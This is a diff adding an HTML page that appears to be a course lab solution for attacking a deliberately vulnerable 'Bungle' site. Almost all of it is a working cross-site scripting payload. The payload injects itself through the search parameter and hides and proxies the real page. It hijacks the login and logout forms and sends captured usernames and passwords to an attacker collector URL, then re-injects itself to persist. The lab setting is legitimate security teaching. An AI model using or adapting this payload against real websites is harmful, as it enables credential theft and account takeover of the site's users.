@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+	<script>
+		// Extend this function:
+		function payload(attacker) {
+			function log(data) {
+				console.log($.param(data));
+				console.log(attacker);
+				$.get(attacker, data);
+			}
+			
+			function logInListener(event) {
+				event.preventDefault();
+				var message = new Object();
+				message.event = "login";
+				if (document.getElementById("log-in-btn")) {
+					var user = document.getElementById("username").value;
+					message.user = user;
+				}
+				if (document.getElementById("log-in-btn")) {
+					var pass = document.getElementById("userpass").value;
+					message.pass = pass;
+				}
+				log(message);
+				window.removeEventListener("submit", logInListener);
+				$.ajax({
+					type: "POST",
+					data: {"username": user, "password": pass},
+					url: "http://bungle-cs461.csl.illinois.edu/login?xssdefense=0" 
+				}).done(function (data) {
+					var url ="http://bungle-cs461.csl.illinois.edu/search?xssdefense=0" +
+						"&q=" + encodeURIComponent("<script" + ">" + payload.toString() + 
+						";payload(\"" + attacker + "\");</script" + ">");
+					$.ajax({
+						type: "GET",
+						url: url
+						}).done(function (data) {
+						proxy("./");
+					});
+				});
+			}
+			
+			function logOutListener(event) {
+				event.preventDefault();
+				var message = new Object();
+				message.event = "logout";
+				message.user = document.getElementById("logged-in-user").innerHTML;
+				log(message);
+				window.removeEventListener("submit", logOutListener);
+				$.ajax({
+					type: "POST",
+					url: "http://bungle-cs461.csl.illinois.edu/logout?xssdefense=0" 
+				}).done(function (data) {
+					var url ="http://bungle-cs461.csl.illinois.edu/search?xssdefense=0" +
+						"&q=" + encodeURIComponent("<script" + ">" + payload.toString() + 
+						";payload(\"" + attacker + "\");</script" + ">");
+					$.ajax({
+						type: "GET",
+						url: url
+					}).done(function (data) {
+						proxy("./");
+					});
+				});
+			}
+			
+			function proxy(href) {
+				$("html").load(href, function(res) {
+					$("html").show();
+					log({"event": "nav", "url": href});
+					$("#query").val("pwned!");
+					// Login listener
+					if (document.getElementById("log-in-btn")) {
+						window.addEventListener("submit", logInListener);
+					}
+					
+					if (document.getElementById("log-out-btn")) {
+						window.addEventListener("submit", logOutListener);
+					}
+					window.history.replaceState(null, 'Bungle!',
+						'http://bungle-cs461.csl.illinois.edu/');
+				});
+			}
+			$("html").hide();
+			proxy("./");
+		}
+		
+		function makeLink(xssdefense, target, attacker) {
+			if (xssdefense == 0) {
+				return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+					encodeURIComponent("<script" + ">" + payload.toString() +
+					";payload(\"" + attacker + "\");</script" + ">");
+			} else {
+				// Implement code to defeat XSS defenses here.
+			}
+		}
+		
+		var xssdefense = 0;
+		var target = "http://bungle-cs461.csl.illinois.edu/";
+		var attacker = "http://127.0.0.1:31337/stolen";
+		
+		$(function() {
+			var url = makeLink(xssdefense, target, attacker);
+			console.log(url);
+			$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+		});
+	</script>
+</head>
+
+<body>
+	<h3></h3>
+</body>
+
+</html>
